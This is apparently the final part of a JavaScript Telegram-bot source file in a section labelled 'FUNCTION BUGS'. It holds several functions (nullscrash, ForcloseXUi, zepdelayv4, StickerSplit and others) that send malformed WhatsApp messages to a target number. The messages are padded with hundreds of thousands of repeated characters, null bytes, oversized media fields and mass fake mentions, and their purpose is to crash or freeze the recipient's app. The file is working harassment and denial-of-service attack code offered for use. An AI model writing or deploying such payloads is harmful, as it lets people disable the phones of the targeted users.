8Sw7Ko6Ztpv+DPwNluaFK6oTo3EI1KU1pKMlqmjAsPurnDbpXFjVdKsk0pJdDOk825g6MQn3Y+RNGvGEdrRGm6pStaHCqRb5+o1dZZwVf6ba/pofZ4JhtlXVa0sqFKquCnCGjRkSzbmH8Qn3Y+Qcc14/038+7HyOnlNPwNq1qzTyqb/wAX5NNzvdUrfLV4qkknUjuRXW2ZDhkPtC07WHih17fX2J1Izv7ipWa5bz4L8kBTi4SjODalFpp9TM9WrxJZPJv79XdZVEsJG8mP5lXtNf8AafINZnxr/ez7q8iBOpUuLidavJzqzespPpZVevGokka9S1KneQUYJrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wXUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
        			thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
        			thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        			thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        			mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        			mediaKeyTimestamp: "1743101489",
        			thumbnailHeight: 641,
        			thumbnailWidth: 640,
        			inviteLinkGroupTypeV2: "DEFAULT",
        			contextInfo: {
        				quotedAd: {
        					advertiserName: "x",
        					mediaType: "IMAGE",
        					jpegThumbnail: "",
        					caption: "x"
        				},
        				placeholderKey: {
        					remoteJid: "0@s.whatsapp.net",
        					fromMe: false,
        					id: "ABCDEF1234567890"
        				}
        			}
        		}
        		
        		const msg = generateWAMessageFromContent(X, {
                    viewOnceMessage: {
                        message: { extendedTextMessage }
                    }
                }, {});
        		
        		await Aii.relayMessage('status@broadcast', msg.message, {
        			messageId: msg.key.id,
        			statusJidList: [X],
        			additionalNodes: [{
        				tag: 'meta',
        				attrs: {},
        				content: [{
        					tag: 'mentioned_users',
        					attrs: {},
        					content: [{
        						tag: 'to',
        						attrs: { jid: X },
        						content: undefined
        					}]
        				}]
        			}]
        		});
        	} catch (err) {
        		console.error(err);
        	}
        };
//======================================//
async function nullscrash(Aii, X, includeParticipant) {
	const media = await prepareWAMessageMedia({
		image: { url: "https://files.catbox.moe/sgul1z.jpg" }
	}, {
		upload: Aii.waUploadToServer
	})
	const cards = [{
		header: {
			imageMessage: media.imageMessage,
			title: "🦠̂⃟꙳͙͡༑ᐧ 𝀽̬̽⃜𑱡 ͜   𝟙 𝕊𝕋𝔸ℝ 𝐒͓͛𝐔͢𝐏𝐄ʺ͜𝐑𝐈ͦ𝐎͓𝐑  ( 𖣂 )  𝐔͢͠𝐍͜𝐈𝐕͡𝐄͜𝐑ͯ𝐒 ༑꙳͆⃟💚",
			subtitle: "𝗦͢𝗮͠𝘀͜𝘂͢𝗸͠𝗲 𝗖͢𝗿͠𝗮𝘀𝗵 𝗕͢𝘆 𝗔͢𝘀͠𝗲𝗽 🐉",
			hasMediaAttachment: true
		},
		body: {
			text: "꙳͙͡༑ᐧ ̬  .....   ͠⤻𝗦͢𝗮͠𝘀͜𝘂͢𝗸͠𝗲 𝗖͢𝗿͠𝗮𝘀𝗵 𝗕͢𝘆 𝗔͢𝘀͠𝗲𝗽 .....  ꙳͙͡༑ᐧ"
		},
		nativeFlowMessage: {
            buttons: [{
               name: 'single_select',
               buttonParamsJson: ''
            }, {
               name: "call_permission_request",
               buttonParamsJson: '{"status":true}'
            }, {
               name: 'mpm',
               buttonParamsJson: '{"status":true}'
            }, {
               name: 'mpm',
               buttonParamsJson: '{"status":true}'
            }, {
               name: 'mpm',
               buttonParamsJson: '{"status":true}'
            }, {
               name: 'mpm',
               buttonParamsJson: '{"status":true}'
            }],
            messageParamsJson: '['.repeat(20000)
        },
	}]
	const msg = generateWAMessageFromContent(X, {
		viewOnceMessageV2Extension: {
			message: {
				interactiveMessage: {
					body: {
						text: "꙳͙͡༑ᐧ ̬  .....   ͠⤻𝗦͢𝗮͠𝘀͜𝘂͢𝗸͠𝗲 𝗖͢𝗿͠𝗮𝘀𝗵 𝗕͢𝘆 𝗔͢𝘀͠𝗲𝗽 .....  ꙳͙͡༑ᐧ"
					},
					carouselMessage: {
						cards,
						messageVersion: 1
					},
					contextInfo: {
						mentionedJid: []
					}
				}
			}
		}
	}, { userJid: X, quoted: dust })
	const relayOptions = {
		messageId: msg.key.id
	}
	if(includeParticipant) {
		relayOptions.participant = {
			jid: X
		}
	}
	await Aii.relayMessage(X, msg.message, relayOptions)
	for(let i = 0; i < 5; i++) {
		await Aii.sendMessage(X, {
			delete: {
				remoteJid: X,
				fromMe: true,
				id: msg.key.id,
				participant: X
			}
		})
	}
}

async function IvsNull(Aii, X) {
const cards = [];
const media = await prepareWAMessageMedia(
{ video: fs.readFileSync("./database/sasuk3.mp4") },
{ upload: Aii.waUploadToServer }
);
const header = {
videoMessage: media.videoMessage,
hasMediaAttachment: false,
contextInfo: {
forwardingScore: 666,
isForwarded: true,
stanzaId: "F1X-" + Date.now(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
quotedMessage: {
extendedTextMessage: {
text: "assalammualaikum izin push kontak sebut nama" + "ꦽ".repeat(1470),
contextInfo: {
mentionedJid: ["13135550002@s.whatsapp.net"],
externalAdReply: {
title: "🩸⃟༑⌁⃰𝐙𝐞‌𝐫𝐨 𝐄𝐱‌‌𝐞𝐜𝐮‌𝐭𝐢𝐨𝐧 𝐕‌𝐚‌𝐮𝐥𝐭ཀ‌‌🦠",
body: "Trusted System",
thumbnailUrl: "",
mediaType: 1,
sourceUrl: "https://tama.example.com",
showAdAttribution: false 
}
}
}
}
}
};
for (let r = 0; r < 30; r++) {
cards.push({
header,
nativeFlowMessage: {
messageParamsJson: "{".repeat(15000) 
}
});
}
const msg = generateWAMessageFromContent(
X,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: "𝗦͢𝗮͠𝘀͜𝘂͢𝗸͠𝗲 𝗖͢𝗿͠𝗮𝘀𝗵 𝗕͢𝘆 𝗔͢𝘀͠𝗲𝗽" + "ꦽ".repeat(1470)
},
carouselMessage: {
cards,
messageVersion: 1
},
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: "13135550002@s.whatsapp.net"
},
stanzaId: "Fx1" + "-Id" + Math.floor(Math.random() * 99999), 
forwardingScore: 100,
isForwarded: true,
mentionedJid: ["13135550002@s.whatsapp.net"], 
externalAdReply: {
title: "🩸⃟༑⌁⃰𝐙𝐞‌𝐫𝐨 𝐄𝐱‌‌𝐞𝐜𝐮‌𝐭𝐢𝐨𝐧 𝐕‌𝐚‌𝐮𝐥𝐭ཀ‌‌🦠",
body: "",
thumbnailUrl: "https://example.com/",
mediaType: 1,
mediaUrl: "",
sourceUrl: "https://GetsuZo.example.com",
showAdAttribution: false
}
}
}
}
}
},
{}
);
await Aii.relayMessage(X, msg.message, {
participant: { jid: X },
messageId: msg.key.id
});
}

async function ForcloseXUi(Aii, target) {
    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true,
                        forwardingScore: 999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target
                        },
                    },
                    body: {
                        text: "饝箔饝箔饾棩饾棶饾棿饾" + "ꦽ".repeat(45000),
                    },
                    nativeFlowMessage: {
                        buttons: [{
                                name: "single_select",
                                buttonParamsJson: "",
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "",
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                        ],
                    },
                },
            },
        },
    };

    await Aii.relayMessage(target, message, {
        participant: {
             jid: target
        },
    });
  console.log(chalk.red("ForcloseXUi SUCCES SENDED"));    
}

async function trashinfinity(Aii, target) {
let virtex = "Call Me🐣";
   Aii.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "FragmentX.I V𝟮" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝗨𝗜 𝗦𝗶𝘀𝘁𝗲𝗺 𝗕𝘆 FragmentX.I" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };

async function zepdelayv4(Aii, target, mention) {
  const pilusGaruda = "ꦽ".repeat(300000);
  const spamMessage = {
    extendedTextMessage: {
      text: pilusGaruda,
      contextInfo: {
        participant: target,
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
          )
        ]
      }
    }
  };

  const chikaSygZep = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "\n\nwho's zephyrine?\n\n",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "galaxy_message"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: `#${Math.floor(Math.random() * 0xffffff).toString(16).padStart(6, "0")}`
  });

  const zepSygChika = generateWAMessageFromContent(target, spamMessage, {});

  await Aii.relayMessage("status@broadcast", zepSygChika.message, {
    messageId: zepSygChika.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  await sleep(500);

  if (mention) {
    await Aii.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: zepSygChika.key.id,
            type: 25
          }
        }
      }
    }, {});
  }

  await Aii.relayMessage("status@broadcast", chikaSygZep.message, {
    messageId: chikaSygZep.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  await sleep(500);

  if (mention) {
    await Aii.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: chikaSygZep.key.id,
            type: 25
          }
        }
      }
    }, {});
  }
}

async function ForceXrimod(Aii, target) {
  const cards = [];
  
  const media = await prepareWAMessageMedia({
		video: {
		url: "https://files.catbox.moe/h3hf0r.mp4"
	}
}, {
	upload: Aii.waUploadToServer
});

  const header = {
    videoMessage: media.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "FnX-" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "𝐑𝐢𝐥𝐥 𝐒𝐢 𝐅𝐨𝐫𝐜𝐞 𝐇𝐚𝐫𝐝 🪽",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "Vallow x Crash",
              body: "Kill System",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://aii.example.com",
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  for (let r = 0; r < 15; r++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "𝐑𝐢𝐥𝐥 𝐒𝐢 𝐅𝐨𝐫𝐜𝐞 𝐇𝐚𝐫𝐝 🪽"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "Nxth" + "-Id" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"],
              externalAdReply: {
                title: "N3xithCore",
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://Nexith-ai.example.com",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await Aii.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function StickerSplit(Aii, target) {
  const stickerPayload = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
          fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
          mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
          mimetype: "image/webp",
          height: 9999,
          width: 9999,
          directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
          fileLength: 12260,
          mediaKeyTimestamp: "1743832131",
          isAnimated: false,
          stickerSentTs: Date.now(),
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
          contextInfo: {
            participant: target,
            mentionedJid: [
              target,
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            participant: target,
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, stickerPayload, {});

  if (Math.random() > 0.5) {
    await Aii.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });
  } else {
    await Aii.relayMessage(target, msg.message, { messageId: msg.key.id });
  }
}
//============================//
// END FUNCTION BUGS

bot.launch();
console.log("Bot telah dimulai...");

// Enable graceful stop
process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
